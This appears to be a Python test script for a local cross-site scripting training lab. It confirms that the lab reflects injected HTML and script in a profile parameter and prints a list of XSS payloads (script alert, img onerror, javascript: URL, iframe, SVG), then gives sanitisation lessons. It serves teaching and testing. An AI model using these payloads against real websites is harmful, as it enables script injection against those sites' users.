#!/usr/bin/env python3
"""
Test script for the XSS-1 lab
This script demonstrates the XSS vulnerability and tests basic functionality.
"""

import requests
import time
import sys

def test_lab_functionality():
    """Test basic lab functionality."""
    base_url = "http://localhost:8087"
    
    print("🔍 Testing XSS-1 Lab Functionality")
    print("=" * 50)
    
    try:
        # Test 1: Home page
        print("\n1. Testing home page...")
        response = requests.get(f"{base_url}/", timeout=10)
        if response.status_code == 200:
            print("   ✅ Home page accessible")
        else:
            print(f"   ❌ Home page failed: {response.status_code}")
            return False
        
        # Test 2: Default profile
        print("\n2. Testing default profile...")
        response = requests.get(f"{base_url}/profile", timeout=10)
        if response.status_code == 200:
            print("   ✅ Default profile accessible")
        else:
            print(f"   ❌ Default profile failed: {response.status_code}")
            return False
        
        # Test 3: Search functionality
        print("\n3. Testing search functionality...")
        response = requests.get(f"{base_url}/search?q=John", timeout=10)
        if response.status_code == 200:
            print("   ✅ Search functionality working")
        else:
            print(f"   ❌ Search failed: {response.status_code}")
            return False
        
        # Test 4: Admin page
        print("\n4. Testing admin page...")
        response = requests.get(f"{base_url}/admin", timeout=10)
        if response.status_code == 200:
            print("   ✅ Admin page accessible")
        else:
            print(f"   ❌ Admin page failed: {response.status_code}")
            return False
        
        return True
        
    except requests.exceptions.ConnectionError:
        print("   ❌ Connection failed - is the lab running?")
        return False
    except Exception as e:
        print(f"   ❌ Unexpected error: {e}")
        return False

def test_xss_vulnerability():
    """Test the XSS vulnerability."""
    base_url = "http://localhost:8087"
    
    print("\n🔒 Testing XSS Vulnerability")
    print("=" * 50)
    
    try:
        # Test 1: Basic HTML injection
        print("\n1. Testing HTML injection...")
        payload = "<h1>XSS Test</h1>"
        response = requests.get(f"{base_url}/profile?id={payload}", timeout=10)
        
        if "<h1>XSS Test</h1>" in response.text:
            print("   ✅ HTML injection successful")
        else:
            print("   ❌ HTML injection failed")
            return False
        
        # Test 2: Script tag injection
        print("\n2. Testing script tag injection...")
        payload = "<script>alert('XSS')</script>"
        response = requests.get(f"{base_url}/profile?id={payload}", timeout=10)
        
        if "<script>alert('XSS')</script>" in response.text:
            print("   ✅ Script tag injection successful")
        else:
            print("   ❌ Script tag injection failed")
            return False
        
        # Test 3: JavaScript execution payload
        print("\n3. Testing JavaScript execution payload...")
        payload = "<script>console.log('XSS Test')</script>"
        response = requests.get(f"{base_url}/profile?id={payload}", timeout=10)
        
        if payload in response.text:
            print("   ✅ JavaScript payload injection successful")
        else:
            print("   ❌ JavaScript payload injection failed")
            return False
        
        return True
        
    except requests.exceptions.ConnectionError:
        print("   ❌ Connection failed - is the lab running?")
        return False
    except Exception as e:
        print(f"   ❌ Unexpected error: {e}")
        return False

def demonstrate_xss_payloads():
    """Demonstrate various XSS payloads."""
    base_url = "http://localhost:8087"
    
    print("\n🎯 XSS Payload Examples")
    print("=" * 50)
    print("The following URLs demonstrate the XSS vulnerability:")
    print()
    
    payloads = [
        ("Basic Alert", "<script>alert('XSS')</script>"),
        ("Console Log", "<script>console.log('XSS Test')</script>"),
        ("HTML Injection", "<h1 style='color:red'>Hacked!</h1>"),
        ("Image with Error", "<img src=x onerror=alert('XSS')>"),
        ("JavaScript URL", "javascript:alert('XSS')"),
        ("Event Handler", "<img src=x onerror=alert('XSS')>"),
        ("Iframe Injection", "<iframe src='javascript:alert(\"XSS\")'></iframe>"),
        ("SVG with Script", "<svg><script>alert('XSS')</script></svg>")
    ]
    
    for name, payload in payloads:
        url = f"{base_url}/profile?id={payload}"
        print(f"• {name}:")
        print(f"  {url}")
        print()

def main():
    """Main test function."""
    print("🚀 XSS-1 Lab Test Suite")
    print("=" * 50)
    
    # Wait a moment for the lab to be ready
    print("Waiting for lab to be ready...")
    time.sleep(2)
    
    # Test basic functionality
    if not test_lab_functionality():
        print("\n❌ Basic functionality tests failed!")
        print("Make sure the lab is running with: make xss-1")
        sys.exit(1)
    
    # Test XSS vulnerability
    if not test_xss_vulnerability():
        print("\n❌ XSS vulnerability tests failed!")
        print("The lab may not be properly configured.")
        sys.exit(1)
    
    # Demonstrate payloads
    demonstrate_xss_payloads()
    
    print("\n🎉 All tests passed!")
    print("\n📚 Learning Objectives:")
    print("• The lab demonstrates a real XSS vulnerability")
    print("• User input is directly embedded in HTML without sanitization")
    print("• This allows attackers to inject and execute arbitrary JavaScript")
    print("• Always validate and sanitize user input before output")
    
    print("\n🔗 Access the lab at: http://localhost:8087")
    print("🔗 Attacker server at: http://localhost:6969")

if __name__ == "__main__":
    main()
